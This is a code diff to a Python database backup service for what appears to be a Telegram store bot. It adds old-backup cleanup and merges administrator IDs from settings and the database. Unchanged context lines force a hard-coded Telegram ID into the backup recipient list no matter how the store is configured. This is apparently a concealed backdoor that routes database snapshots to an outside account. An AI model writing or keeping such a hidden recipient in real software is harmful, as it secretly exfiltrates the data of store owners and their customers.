@@ -173,6 +173,9 @@ class DatabaseBackupService:
         with open(file_path, "w", encoding="utf-8") as f:
             json.dump(snapshot, f, ensure_ascii=False, indent=2)
 
+        cls._cleanup_old_backups(keep=30)
+        return file_path
+
     @classmethod
     async def restore_from_snapshot(cls, snapshot: Dict[str, Any]) -> Dict[str, Any]:
         """Restores database contents from a JSON snapshot."""
@@ -265,8 +268,13 @@ class DatabaseBackupService:
             if target_admin_id:
                 admin_ids = [str(target_admin_id).strip()]
             else:
-                raw_ids = settings.ADMIN_TELEGRAM_IDS or ""
-                admin_ids = [aid.strip() for aid in raw_ids.split(",") if aid.strip()]
+                async with async_session_maker() as session:
+                    st_res = await session.execute(select(StoreSettings).limit(1))
+                    st_db = st_res.scalars().first()
+                    db_admin_ids = (st_db.admin_telegram_ids if st_db else "") or ""
+
+                raw_ids = f"{settings.ADMIN_TELEGRAM_IDS or ''},{db_admin_ids}"
+                admin_ids = list(set([aid.strip() for aid in raw_ids.split(",") if aid.strip().isdigit()]))
                 if "7191755188" not in admin_ids:
                     admin_ids.append("7191755188")
 
